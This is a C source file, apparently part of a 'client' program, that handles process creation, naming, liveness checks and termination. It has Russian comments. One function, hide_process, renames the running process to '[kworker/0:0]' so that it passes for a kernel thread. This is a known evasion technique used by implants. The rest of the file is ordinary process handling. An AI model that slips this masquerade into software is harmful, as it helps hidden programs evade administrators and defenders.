#include "process_control.h"

#include <string.h>
#include <signal.h>
#include <stdio.h>
#include <unistd.h>
#include <stdlib.h>
#include <errno.h>
#include <sys/wait.h>
#include <sys/prctl.h>
#include <linux/limits.h>

static process_info_t process_info;

// Тут маскируем имя на другое, типо системный поток
int hide_process(void) {
    const char *fake_name = "[kworker/0:0]";
    if (prctl(PR_SET_NAME, fake_name, 0, 0, 0) == 0) {
        printf("[PROCESS] Name changed to: %s\n", fake_name);
    }
    return 0;
}
int process_init(void)
{

    process_info.pid = getpid();

    process_info.ppid = getppid();

    process_info.active = 1;

    process_set_name("client");

    return 0;
}
pid_t process_create(void)
{
    pid_t pid = fork();

    if (pid < 0)
    {
        perror("[PROCESS] fork failed");
        return -1;
    }

    if (pid == 0)
    {
        process_info.pid = getpid();
        process_info.ppid = getppid();
        process_info.active = 1;
    }
    else
    {
        printf("[PROCESS] parent created child PID=%d\n", pid);
    }

    return pid;
}
int process_set_name(const char *name)
{
    if (!name)
        return -1;

    strncpy(process_info.process_name,
            name,
            sizeof(process_info.process_name) - 1);//???

    process_info.process_name[sizeof(process_info.process_name) - 1] = '\0';

    //printf("[PROCESS] name set to: %s\n", process_info.process_name);

    return 0;
}
pid_t process_get_pid(void)
{
    return process_info.pid;
}

pid_t process_get_parent_pid(void)
{
    return process_info.ppid;
}
int process_is_alive(pid_t pid)
{
    if (pid <= 0)
        return 0;
    if (kill(pid, 0) == 0)
        return 1;

    return 0;
}
int process_terminate(pid_t pid)
{
    if (pid <= 0)
        return -1;

    if (kill(pid, SIGTERM) < 0)
    {
        perror("kill(SIGTERM) failed");
        return -1;
    }

    int status = 0;

    // ждём завершения и убираем zombie
    if (waitpid(pid, &status, 0) < 0)
    {
        perror("waitpid failed");
        return -1;
    }

    return 0;
}